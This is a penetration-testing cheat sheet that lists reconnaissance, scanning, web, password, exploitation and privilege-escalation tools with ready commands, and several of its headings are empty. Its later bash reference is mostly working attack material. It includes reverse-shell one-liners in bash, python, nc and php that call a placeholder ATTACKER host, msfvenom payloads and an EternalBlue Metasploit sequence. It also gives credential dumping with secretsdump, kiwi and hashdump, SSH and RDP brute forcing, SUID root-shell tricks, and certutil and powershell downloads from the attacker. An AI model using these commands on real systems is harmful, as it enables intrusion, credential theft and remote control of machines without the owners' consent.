```
┌─────────────────────────────────────────────────────┐
│              VAPT TOOL CATEGORIES                   │
├─────────────────────────────────────────────────────┤
│  1. Reconnaissance Tools                            │
│  2. Scanning & Enumeration Tools                    │
│  3. Vulnerability Assessment Tools                  │
│  4. Exploitation Tools                              │
│  5. Post-Exploitation Tools                         │
│  6. Password Attack Tools                           │
│  7. Web Application Tools                           │
│  8. Network Tools                                   │
│  9. Wireless Tools                                  │
│  10. Reporting Tools                                │
└─────────────────────────────────────────────────────┘
```


# 1, Reconnaissance Tools

## Whois - Domain Registration Information
```
# Basic whois lookup
whois example.com

# Specific whois server
whois -h whois.verisign-grs.com example.com

# Extract emails
whois example.com | grep -i email

# Extract name servers
whois example.com | grep -i "name server"
```

**What you get:**
- Registrar information
- Registration/expiration dates
- Name servers
- Contact information (often redacted)
- Domain status

## Dig - DNS Lookup Tool
```
# Basic DNS query
dig example.com

# Query specific record type
dig example.com A          # IPv4 address
dig example.com AAAA       # IPv6 address
dig example.com MX         # Mail servers
dig example.com NS         # Name servers
dig example.com TXT        # TXT records
dig example.com SOA        # Start of Authority
dig example.com ANY        # All records

# Short answer only
dig example.com +short

# Reverse DNS lookup
dig -x 8.8.8.8

# Query specific DNS server
dig @8.8.8.8 example.com

# DNS zone transfer attempt (CRITICAL for VAPT)
dig axfr @ns1.example.com example.com

# Trace DNS resolution path
dig example.com +trace
```

## Nslookup - DNS Query Tool
```
# Basic lookup
nslookup example.com

# Query specific record
nslookup -type=MX example.com
nslookup -type=NS example.com
nslookup -type=TXT example.com

# Use specific DNS server
nslookup example.com 8.8.8.8

# Interactive mode
nslookup
> set type=MX
> example.com
> exit
```

## theHarvester - OSINT Email/Subdomain Harvester
```
# Install (if not present)
apt install theharvester

# Basic usage
theHarvester -d example.com -b google

# Multiple sources
theHarvester -d example.com -b google,bing,linkedin

# All sources
theHarvester -d example.com -b all

# Limit results
theHarvester -d example.com -b google -l 100

# Save to file
theHarvester -d example.com -b all -f results.html

# Common sources:
# google, bing, linkedin, twitter, yahoo
# baidu, dnsdumpster, virustotal, threatcrowd
```

**Output includes:**
- Email addresses
- Subdomains
- Employee names
- IP addresses
- URLs

## Sublist3r - Subdomain Enumeration
```
# Install
apt install sublist3r

# Basic enumeration
sublist3r -d example.com

# Enable brute force
sublist3r -d example.com -b

# Use specific engines
sublist3r -d example.com -e google,yahoo,bing

# Save output
sublist3r -d example.com -o subdomains.txt

# Verbose mode
sublist3r -d example.com -v
```

## Amass - Advanced Subdomain Enumeration 
```
# Install
apt install amass

# Basic enumeration
amass enum -d example.com

# Passive enumeration only (no direct queries)
amass enum -passive -d example.com

# Active enumeration
amass enum -active -d example.com

# Brute force subdomains
amass enum -brute -d example.com

# Output to file
amass enum -d example.com -o amass_results.txt

# Use specific resolvers
amass enum -d example.com -rf resolvers.txt

# Maximum depth
amass enum -d example.com -max-depth 3
```

# 2, Scanning & Enumeration Tools

## Nmap - Network Mapper
## Masscan - Fast Port Scanner

## Enum4linux - Windows/SMB Enumeration 
```
# Full enumeration
enum4linux -a 192.168.1.10

# User enumeration
enum4linux -U 192.168.1.10

# Share enumeration
enum4linux -S 192.168.1.10

# Password policy
enum4linux -P 192.168.1.10

# OS information
enum4linux -o 192.168.1.10

# Group enumeration
enum4linux -G 192.168.1.10

# With credentials
enum4linux -u administrator -p password123 192.168.1.10
```

**What it enumerates:**
- Users
- Shares
- Groups
- Password policy
- OS information
- Domain information

## SMBMap - SMB Share Enumeration
## SMBClient - SMB Client Tool

## DNSEnum - DNS Enumeration
## DNSRecon - DNS Reconnaissance


# Vulnerability Assessment Tools

## Nessus - Commercial Vulnerability Scanner

**Installation:**
```
# Download from tenable.com
# Install .deb package
dpkg -i Nessus-*.deb

# Start service
systemctl start nessusd

# Access via browser
https://localhost:8834
```

**Usage:**
- Create scan policy
- Define targets
- Run scan
- Review vulnerabilities by severity
- Export reports

## OpenVAS - Open Source Vulnerability Scanner
## Nikto - Web Server Scanner 

## WPScan - WordPress Scanner 

## Nuclei - Vulnerability Scanner with Templates

___ 
# 3, Web Application Tools

## Burp Suite - Web Application Testing Platform

**Key Features:**
- Proxy: Intercept HTTP/HTTPS requests
- Repeater: Modify and resend requests
- Intruder: Automated attacks (brute force, fuzzing)
- Scanner: Automated vulnerability scanning (Pro only)
- Decoder: Encode/decode data
- Comparer: Compare responses


## OWASP ZAP - Web Application Security Scanner

```
# Start ZAP
zaproxy

# Command line scan
zap.sh -cmd -quickurl http://example.com -quickout report.html

# Automated scan
zap.sh -cmd -quickurl http://example.com -quickprogress
```

**Features:**
- Automated scanner
- Manual testing tools
- Fuzzer
- Spider/crawler
- Active/passive scanning

## Ffuf - Fast Web Fuzzer
```
# Directory brute force
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# File extension fuzzing
ffuf -u http://example.com/indexFUZZ -w extensions.txt

# Virtual host discovery
ffuf -u http://example.com -H "Host: FUZZ.example.com" -w subdomains.txt

# Parameter fuzzing
ffuf -u http://example.com/page?FUZZ=value -w params.txt

# POST data fuzzing
ffuf -u http://example.com/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt

# Filter by status code
ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 404

# Filter by response size
ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 1234

# Match specific status codes
ffuf -u http://example.com/FUZZ -w wordlist.txt -mc 200,301,302

# Output to file
ffuf -u http://example.com/FUZZ -w wordlist.txt -o results.txt

# Colorize output
ffuf -u http://example.com/FUZZ -w wordlist.txt -c
```


## Gobuster - Directory/DNS Brute Forcer

## Dirb - Web Content Scanner

## SQLMap - SQL Injection Tool


# 4, Password Attack Tools
## Hydra - Network Login Brute Forcer 
## Medusa - Brute Force Tool
## John the Ripper - Password Cracker
## Hashcat - Advanced Password Cracker


# 6, Post-Exploitation Tools
## Metasploit Meterpreter 
## Impacket Tools - Windows Post-Exploitation
## Mimikatz - Windows Credential Dumper
## BloodHound - Active Directory Mapping


# 7, Network Tools
## Wireshark - Packet Analyzer
## Tcpdump - Packet Capture
## Bettercap - Network Attack Framework

# 8, Wordlists & Payload Generators
## SecLists - Security Wordlists
## Rockyou Wordlist 
## CeWL - Custom Wordlist Generator
## Crunch - Wordlist Generator


#  Quick Reference
```bash
# DNS Enumeration
dig example.com ANY
dnsenum example.com
dnsrecon -d example.com

# Subdomain Discovery
sublist3r -d example.com
amass enum -d example.com

# Port Scanning
nmap -sC -sV -p- target
masscan target/24 -p 0-65535 --rate 10000

# Web Enumeration
gobuster dir -u http://target -w wordlist.txt
ffuf -u http://target/FUZZ -w wordlist.txt
nikto -h http://target

# SMB Enumeration
enum4linux -a target
smbmap -H target
crackmapexec smb target

# Password Attacks
hydra -l user -P passwords.txt ssh://target
hashcat -m 0 hashes.txt wordlist.txt
john --wordlist=rockyou.txt hashes.txt

# SQL Injection
sqlmap -u "http://target/page?id=1" --dbs

# Post-Exploitation
impacket-secretsdump admin:pass@target
load kiwi; creds_all
```


```bash

# ============================================
# 1. RECONNAISSANCE
# ============================================

# DNS Enumeration
whois example.com
dig example.com ANY
dig example.com MX +short
dig axfr @ns1.example.com example.com
host -t MX example.com
nslookup -type=NS example.com

# Subdomain Discovery
sublist3r -d example.com -o subs.txt
amass enum -d example.com
assetfinder example.com
subfinder -d example.com

# OSINT (Information Gathering)
theHarvester -d example.com -b google,bing,linkedin
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u

# ============================================
# 2. SCANNING & ENUMERATION
# ============================================

# Port Scanning - NMAP (Most Important)
nmap -sS --top-ports 1000 -T4 target                    # Quick scan
nmap -sC -sV -p- -oA full_scan target                   # Full scan
nmap --script vuln target                                # Vulnerability scan
nmap -sU --top-ports 100 target                         # UDP scan
nmap -p 80,443 --script http-enum target                # HTTP enumeration

# Fast Scanning
masscan target/24 -p 0-65535 --rate 10000
rustscan -a target

# SMB Enumeration (Port 139/445)
enum4linux -a target
smbmap -H target
smbclient -L //target -N
crackmapexec smb target
nbtscan 192.168.1.0/24

# SNMP Enumeration (Port 161)
snmp-check target
snmpwalk -c public -v2c target

# DNS Enumeration
dnsenum example.com
dnsrecon -d example.com

# NFS Enumeration (Port 2049)
showmount -e target
mount -t nfs target:/share /mnt/nfs

# ============================================
# 3. WEB APPLICATION TESTING
# ============================================

# Directory/File Discovery
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u http://target/FUZZ -w wordlist.txt -fc 404 -c
dirb http://target
feroxbuster -u http://target

# Web Vulnerability Scanning
nikto -h http://target
wpscan --url http://target --enumerate ap,at,u
nuclei -u http://target -severity critical,high
whatweb http://target

# SQL Injection
sqlmap -u "http://target/page.php?id=1"
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump
sqlmap -u "http://target/page.php?id=1" --os-shell

# XSS Testing
dalfox url "http://target/search?q=test"

# Manual Testing with Burp Suite
# 1. Set browser proxy to 127.0.0.1:8080
# 2. Intercept requests in Proxy tab
# 3. Send to Repeater for testing
# 4. Use Intruder for fuzzing

# ============================================
# 4. PASSWORD ATTACKS
# ============================================

# Online Brute Force - HYDRA
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
hydra -l admin -P passwords.txt ftp://target
hydra -l admin -P passwords.txt smb://target
hydra -l admin -P passwords.txt rdp://target
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"

# Hash Cracking - HASHCAT
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # sha512crypt
hashcat -m 0 hashes.txt --show                                # Show cracked

# Hash Cracking - JOHN THE RIPPER
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
zip2john file.zip > hash.txt
ssh2john id_rsa > hash.txt
unshadow /etc/passwd /etc/shadow > hashes.txt

# Windows Attacks
crackmapexec smb target -u admin -p password --shares
crackmapexec smb target -u admin -p password --sam
crackmapexec smb target -u admin -H NTLM_HASH

# ============================================
# 5. EXPLOITATION
# ============================================

# Metasploit Framework
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Multi Handler (Listener)
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit -j

# Searchsploit (Find Exploits)
searchsploit apache 2.4
searchsploit windows smb
searchsploit -m exploits/linux/remote/12345.py

# Reverse Shells - LISTENERS
nc -lvnp 4444

# Reverse Shells - PAYLOADS
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
nc -e /bin/bash ATTACKER 4444
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# MSFVenom Payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php

# Shell Stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# ============================================
# 6. POST-EXPLOITATION
# ============================================

# Meterpreter Commands
sysinfo
getuid
getsystem
hashdump
load kiwi
creds_all
upload /local/file C:\\remote\\path
download C:\\remote\\file /local/path
shell
screenshot
ps
migrate PID

# Impacket Tools
impacket-psexec admin:pass@target
impacket-secretsdump admin:pass@target
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC_IP
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request

# CrackMapExec
crackmapexec smb target -u admin -p pass --shares
crackmapexec smb target -u admin -p pass --sam
crackmapexec smb target -u admin -p pass -x "whoami"

# ============================================
# 7. PRIVILEGE ESCALATION
# ============================================

# Linux Enumeration
whoami
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*

# Linux Automated Tools
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploitation
# If find has SUID:
find . -exec /bin/bash -p \;

# If vim has SUID:
vim -c ':!/bin/bash'

# If python has SUID:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Windows Enumeration
whoami /priv
systeminfo
net user
net localgroup administrators
netstat -ano

# Windows Automated Tools
winPEASx64.exe
.\Seatbelt.exe -group=all

# Windows Exploitation (Meterpreter)
getsystem
run post/multi/recon/local_exploit_suggester

# ============================================
# 8. FILE TRANSFERS
# ============================================

# Start HTTP Server
python3 -m http.server 8000

# Download - Linux
wget http://ATTACKER:8000/file
curl http://ATTACKER:8000/file -o file

# Download - Windows
certutil -urlcache -f http://ATTACKER:8000/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/file.exe','file.exe')"

# SMB Server
impacket-smbserver share . -smb2support
# Windows: copy \\ATTACKER\share\file.exe .

# SCP
scp file.txt user@target:/path/
scp user@target:/path/file.txt .

# ============================================
# 9. NETWORK TOOLS
# ============================================

# Packet Capture
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap
tshark -i eth0 -w capture.pcap

# Network Attacks
responder -I eth0 -rdwv
bettercap -iface eth0

# ============================================
# 10. COMMON WORDLISTS
# ============================================

# Rockyou
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# Generate Custom Wordlist
cewl http://target -w wordlist.txt -m 6
crunch 8 8 -t pass%%%% -o wordlist.txt

# ============================================
# 11. QUICK REFERENCE - TOP 20 COMMANDS
# ============================================

# 1. Quick port scan
nmap -sS --top-ports 1000 TARGET

# 2. Full port scan
nmap -sC -sV -p- TARGET

# 3. Web directory scan
gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt

# 4. SQL injection test
sqlmap -u "URL?id=1" --dbs

# 5. SSH brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# 6. SMB enumeration
enum4linux -a TARGET

# 7. Subdomain enumeration
sublist3r -d example.com

# 8. Find SUID files
find / -perm -4000 -type f 2>/dev/null

# 9. Check sudo permissions
sudo -l

# 10. Start reverse shell listener
nc -lvnp 4444

# 11. Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 12. Start HTTP server
python3 -m http.server 8000

# 13. Download file (Linux)
wget http://ATTACKER:8000/file

# 14. Download file (Windows)
certutil -urlcache -f http://ATTACKER:8000/file.exe file.exe

# 15. Crack MD5 hash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 16. Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 17. Extract hash from zip
zip2john file.zip > hash.txt

# 18. Dump credentials (Meterpreter)
load kiwi; creds_all

# 19. Dump credentials (Impacket)
impacket-secretsdump admin:pass@target

# 20. Web vulnerability scan
nikto -h http://target



# ============================================
# 14. USEFUL ONLINE RESOURCES
# ============================================

GTFOBins          - https://gtfobins.github.io/
LOLBAS            - https://lolbas-project.github.io/
HackTricks        - https://book.hacktricks.xyz/
RevShells         - https://www.revshells.com/
PayloadsAllThings - https://github.com/swisskyrepo/PayloadsAllTheThings
Exploit-DB        - https://www.exploit-db.com/
CyberChef         - https://gchq.github.io/CyberChef/

# ============================================
# 15. PRE-ENGAGEMENT CHECKLIST
# ============================================

[ ] Get written authorization
[ ] Define scope (IPs, domains, out-of-scope)
[ ] Define testing window
[ ] Define rules of engagement
[ ] Emergency contacts
[ ] Backup/snapshot targets (if allowed)

```